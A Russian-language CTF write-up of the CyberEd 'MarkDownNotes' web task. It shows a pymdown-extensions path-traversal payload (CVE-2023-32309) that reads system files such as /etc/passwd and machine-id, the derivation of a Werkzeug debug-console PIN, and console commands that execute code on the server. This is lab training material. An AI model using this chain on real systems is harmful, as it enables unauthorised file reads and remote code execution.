
Райтап на Web таск от CyberEd - "MarkDownNotes"
Описание: 
"MarkDownNotes - очередной сайт для хранения заметок. Мы заботимся о безопасности данных наших клиентов! Однако на поддержание сервиса уходит много средств, поэтому бесплатно предоставляются только 10 заметок. Используйте их с умом! Акция: найдите багу по программе бабаунти и докажите её, исполнив файл read_flag в корне приложения, и получите бесплатное пользование сервисом навсегда!"

После регистрации на [сайте](http://mdn.cyber-ed.space) нас встречает сервис заметок:
![[main_site.png]]Добавлять можно до 10 заметок на аккаунт.


### Разведка
Запустим nikto:
![[nikto_out.png]]

Переходим на http://mdn.cyber-ed.space/console:
![[flask_console.png]]
На нем находится Werkzeug Debugger, значит сайт написан на Flask.
Чтобы зайти в консоль и выполнить файл read_flag нам нужно знать pin-код, а у нас его нет.
Из [статьи](https://habr.com/ru/articles/738238/pin-код) узнаем, что pin-код flask генерируетcя на основе:
1.  Appname (`getattr(app, "__name__", type(app).__name__)`) по умолчанию имеет значение `Flask`
2. `getattr(mod, "__file__", None),` или путь до Flask
3. Modname, по умолчанию `flask.app`
4. Username - имя пользователя в системе linux
5. MAC-адрес устройства
6. Machine_id - ID устройства
Нам сразу известны Appname и Modname.
Надо найти остальные значения, прочитав файлы в системе.

### Получаем AFR (arbitrary file read)
Тут обращаемся к особенности таска - *markdown*.
Ищем расширения на python:
![[markdown_search.png]]
Находим два основных расширения: Python-Markdown и pymdown-extensions.
На Python-Markdown я не нашел AFR, в отличии от pymdown-extensions ([CVE-2023-32309](https://www.cve.org/CVERecord?id=CVE-2023-32309), [github](https://github.com/advisories/GHSA-jh85-wwv9-24hv)):
![[pymdown_AFR.png]]
Создадим шаблон, который мы будем менять и отправлять: `--8<-- "../../../../etc/passwd"`
Попробуем прочитать /etc/passwd (`--8<-- "../../../../etc/passwd"`):
![[passwd.png]]
Успешно.
Теперь мы можем прочитать нужные нам файлы для генерации pin-кода.

### Получение данных и генерация pin-кода
Имя пользователя мы уже получили из /etc/passwd - "app"
Чтобы получить MAC-адрес, нам нужно знать по какому интерфейсу устройство выходит в сеть. Для этого читаем файл `/proc/net/dev` (`--8<-- "../../../../proc/net/dev"`):
```
Inter-| Receive | Transmit face |bytes packets errs drop fifo frame compressed multicast|bytes packets errs drop fifo colls carrier compressed eth0: 86949846 338155 0 0 0 0 0 0 100381675 357756 0 0 0 0 0 0 lo: 1341217 13102 0 0 0 0 0 0 1341217 13102 0 0 0 0 0 0
```
Видно, что соединение происходит по eth0.
Смотрим MAC-адрес (`--8<-- "../../../../sys/class/net/eth0/address"`):
`02:42:ac:18:00:04`

Чтобы найти machine-id читаем файл `/etc/machine-id`:
`04a9330868336aa19c457b402d5a4f7c`
и  `/proc/self/cgroup`:
```
12:blkio:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 11:rdma:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 10:pids:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 9:perf_event:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 8:freezer:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 7:net_cls,net_prio:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 6:devices:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 5:hugetlb:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 4:cpu,cpuacct:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 3:cpuset:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 2:memory:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 1:name=systemd:/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9 0::/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9
```
Из `/proc/self/cgroup` нам нужна последняя строчка:
`0::/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9`

Чтобы найти путь к app.py мы должны вызвать ошибку в Flask. Для этого можно отправить POST запрос на создание заметки без указания "title" и "content": 
```
POST 
http://mdn.cyber-ed.space/profile 
Cookie: session=your_cookie
```
![[burp.png]]
Путь к приложению: `/usr/local/lib/python3.8/site-packages/flask/app.py`

Итого имеем:
```
machine_id: 04a9330868336aa19c457b402d5a4f7c
username: app
name: Flask
Modname: flask.app
MAC: 02:42:ac:18:00:04
path: /usr/local/lib/python3.8/site-packages/flask/app.py
```

Для генерации pin-кода и cookie используем [этот скрипт](https://github.com/SidneyJob/Werkzeuger).
Устанавливаем:
```
git clone https://github.com/SidneyJob/Werkzeuger
cd Werkzeuger
```

Запускаем скрипт, подставляя наши значения:
```
python gen.py --username app --path /usr/local/lib/python3.8/site-packages/flask/app.py --mac 02:42:ac:18:00:04 --machine_id 04a9330868336aa19c457b402d5a4f7c  --cgroup 0::/docker/dd35ea90bfcd720753811d819d07487f73bfcb410a477e014b0edb56db5bf0f9

```
![[run_script.png]]
Получаем куки:
![[run_script.png]]
![[run_script_out.png]]

Нам нужны строчки:
```
[+] Success!
[*] PIN: 233-535-197
[*] Cookie: __wzd49d0c27c7911c3fc007f=1710008146|6e27d4a6cf2a
[*] Modname: flask.app
[*] Appname: Flask
```


### Получаем доступ к консоли
Если у Вас превышен лимит на ввод pin-кода, то открываем [консоль](http://mdn.cyber-ed.space/console) и подставляем куки в браузер (иначе можете просто ввести pin):
![[new_cookie.png]]
Перезагружаем страницу.
Мы зашли в консоль.
![[console_enter.png]]


### Получаем флаг
Посмотрим файлы в директории:
```
import subprocess
subprocess.run(["ls", "-lah"], capture_output=True)
```
Видим тот самый файл с флагом.
```
CompletedProcess(args=['ls', '-lah'], returncode=0, stdout=b'total 72K\ndrwxr-xr-x 1 app app 4.0K Mar 9 15:14 
ndrwxr-xr-x 1 root root 4.0K Mar 5 14:38 
-rw-r--r-- 1 app app 519 Sep 23 20:02 config.py
-rwxr-xr-x 1 app app 151 Sep 22 15:07 entrypoint.sh
-rw-r--r-- 1 app app 162 Sep 23 18:35 main.py
-rw-r--r-- 1 app app 599 Sep 22 15:07 manage.py
drwxr-xr-x 1 app app 4.0K Sep 22 14:19 models
drwxr-xr-x 1 app app 4.0K Sep 23 19:26 modules
---s--x--x 1 root root 17K Sep 23 16:40 read_flag
-rw-r--r-- 1 app app 118 Sep 23 18:38 requirements.txt
drwxr-xr-x 4 root root 4.0K Sep 22 14:52 static
drwxr-xr-x 1 app app 4.0K Sep 22 14:23 templates
drwxr-xr-x 1 app app 4.0K Sep 23 18:33 utils', stderr=b'')
```
Смотрим в какой директории мы находимся:
```
subprocess.run(["pwd"], capture_output=True)
```
Мы находимся в папке "/app":
`CompletedProcess(args=['pwd'], returncode=0, stdout=b'/app\n', stderr=b'')`

Чтобы выполнить файл "read_flag" вводим команду:
```
subprocess.run(["/app/read_flag"], capture_output=True)
```
Получаем флаг:
```
CompletedProcess(args=['/app/read_flag'], returncode=0, stdout=b'flag{fl45k_d3bu6_m0d3_15_un54f3}', stderr=b'')
```
![[console_flag.png]]
##### Флаг: flag{fl45k_d3bu6_m0d3_15_un54f3}


Спасибо за прочтение!

Полезные ссылки:
https://habr.com/ru/articles/738238/
https://security.snyk.io/vuln/SNYK-PYTHON-PYMDOWNEXTENSIONS-5537103
